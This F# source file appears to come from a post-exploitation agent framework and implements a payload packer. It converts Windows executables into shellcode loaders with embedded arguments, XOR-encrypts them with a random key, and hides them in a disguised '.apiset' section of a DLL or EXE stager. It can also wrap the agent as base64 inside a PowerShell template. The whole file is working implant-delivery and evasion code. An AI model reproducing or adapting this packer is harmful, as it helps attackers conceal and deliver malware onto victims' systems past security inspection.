namespace ES.Alan.Core

open System
open System.IO
open System.Reflection.PortableExecutable
open System.Reflection
open System.Text
open ES.Alan.Core.Entities
open PeNet

type PackerSettings() =    
    member val PeLoaderX86 = String.Empty with get, set
    member val PeLoaderX64 = String.Empty with get, set
    member val DotNetAgentRunnerFileX86 = String.Empty with get, set
    member val DotNetAgentRunnerFileX64 = String.Empty with get, set
    member val DllStagerX86 = String.Empty with get, set
    member val DllStagerX64 = String.Empty with get, set
    member val ExeStagerX86 = String.Empty with get, set
    member val ExeStagerX64 = String.Empty with get, set
    member val PowerShellTemplateX86 = String.Empty with get, set
    member val PowerShellTemplateX64 = String.Empty with get, set
 
type ArtifactPacker(settings: PackerSettings) =
    let encryptContent(xorKey: Byte array, content: Byte array) =
        for i=0 to content.Length-1 do
            content.[i] <- content.[i] ^^^ xorKey.[i % xorKey.Length]

    let getLoader(content: Byte array) =
        match CpuBitness.FromPeContent(content) with
        | CpuBitness.Bitness32 -> settings.PeLoaderX86
        | CpuBitness.Bitness64 -> settings.PeLoaderX64
        |> File.ReadAllBytes

    let getStager(isDll: Boolean, content: Byte array) =
        if isDll then
            match CpuBitness.FromPeContent(content) with
            | CpuBitness.Bitness32 -> settings.DllStagerX86
            | CpuBitness.Bitness64 -> settings.DllStagerX64
        else
            match CpuBitness.FromPeContent(content) with
            | CpuBitness.Bitness32 -> settings.ExeStagerX86
            | CpuBitness.Bitness64 -> settings.ExeStagerX64
        |> File.ReadAllBytes

    let composeShellCodeLoader(fileContent: Byte array, arguments: String array) =
        let bitness = CpuBitness.FromPeContent(fileContent)
        let peLoader = getLoader(fileContent)
        use memStream = new MemoryStream(peLoader)
        use peReader = new PEReader(memStream)
        let peLoaderShellcode = peReader.GetSectionData(".text").GetContent() |> Seq.toArray

        use argumentMemStream = new MemoryStream()
        use binWriter = new BinaryWriter(argumentMemStream)

        if arguments.Length > 0 then
            arguments 
            |> Array.map(fun arg -> String.Format("\"{0}\"", arg))
            |> fun args -> String.Join(' ', args)
            |> Encoding.Unicode.GetBytes
            |> binWriter.Write
            binWriter.Write(0uy)       
        
        let peLoaderArguments = argumentMemStream.ToArray()

        let argumentsSize =
            match bitness with
            | CpuBitness.Bitness32 -> BitConverter.GetBytes(uint32 peLoaderArguments.Length)
            | CpuBitness.Bitness64 -> BitConverter.GetBytes(uint64 peLoaderArguments.Length)

        [
            peLoaderShellcode
            peLoaderArguments
            argumentsSize
            fileContent
        ]
        |> Array.concat

    let packPe(isDll: Boolean, content: Byte array, arguments: String array) =
        let shellcode = composeShellCodeLoader(content, arguments)
        let stager = getStager(isDll, content)
        
        // create the section that will contain the encrypted shellcode        
        let peFile = new PeFile(stager)
        let sectionName = ".apiset"       
        if peFile.ImageSectionHeaders |> Seq.exists(fun s -> s.Name.Equals(sectionName, StringComparison.OrdinalIgnoreCase)) then
            peFile.RemoveSection(sectionName)
        let xorKey = Utility.generateRandomBuffer(15, 35)
        encryptContent(xorKey, shellcode)
        let totalLength = xorKey.Length + shellcode.Length + 8        
        peFile.AddSection(sectionName, totalLength, Header.Pe.ScnCharacteristicsType.MemRead)

        // set the section value, format: <DWORD key size><xor key><DWORD shellcode size><shellcode>
        let section = 
            peFile.ImageSectionHeaders 
            |> Seq.find(fun s -> s.Name.Equals(sectionName, StringComparison.OrdinalIgnoreCase))

        use sectionContent = new MemoryStream()
        use binWriter = new BinaryWriter(sectionContent)
        binWriter.Write(int32 xorKey.Length)
        binWriter.Write(int32 shellcode.Length)
        binWriter.Write(xorKey)        
        binWriter.Write(shellcode)
        peFile.RawFile.WriteBytes(int64 section.PointerToRawData, sectionContent.ToArray().AsSpan<Byte>())
        peFile.RawFile.ToArray()

    let packageDll(content: Byte array, arguments: String array) =
        packPe(true, content, arguments)

    let packageExe(content: Byte array, arguments: String array) =
        packPe(false, content, arguments)    

    let packageVanillaExe(peFileContent) =
        peFileContent

    let packagePowerShell(content: Byte array, arguments: String array) =  
        let curDir = Path.Combine(Path.GetDirectoryName(Assembly.GetEntryAssembly().Location))
        let bitness = CpuBitness.FromPeContent(content)
        let powerShellTemplateFilename =
            match bitness with
            | CpuBitness.Bitness32 -> settings.PowerShellTemplateX86
            | CpuBitness.Bitness64 -> settings.PowerShellTemplateX64
                    
        let dotNetAgentRunner = 
            match bitness with
            | CpuBitness.Bitness32 -> settings.DotNetAgentRunnerFileX86
            | CpuBitness.Bitness64 -> settings.DotNetAgentRunnerFileX64
            |> File.ReadAllBytes
            |> Convert.ToBase64String
                    
        let powershellContent = 
            File.ReadAllText(Path.Combine(curDir, powerShellTemplateFilename))
                .Replace("%AGENT_RUNNER%", dotNetAgentRunner)
                .Replace("%AGENT%", composeShellCodeLoader(content, arguments) |> Convert.ToBase64String)
        
        Encoding.UTF8.GetBytes(powershellContent)    

    member this.PackPe(peFileContent: Byte array, packageType: Packaging, arguments: String array) =
        match packageType with
        | Packaging.DLL -> packageDll(peFileContent, arguments)
        | Packaging.Executable -> packageExe(peFileContent, arguments)
        | Packaging.Vanilla -> packageVanillaExe(peFileContent)
        | Packaging.Shellcode -> composeShellCodeLoader(peFileContent, arguments)
        | Packaging.PowerShell -> packagePowerShell(peFileContent, arguments)

    member this.PackPe(peFileContent: Byte array, packageType: Packaging) =
        this.PackPe(peFileContent, packageType, Array.empty)

    member this.PackPe(peFile: String, packageType: Packaging) =
        let peFileContent = File.ReadAllBytes(peFile)
        this.PackPe(peFileContent, packageType)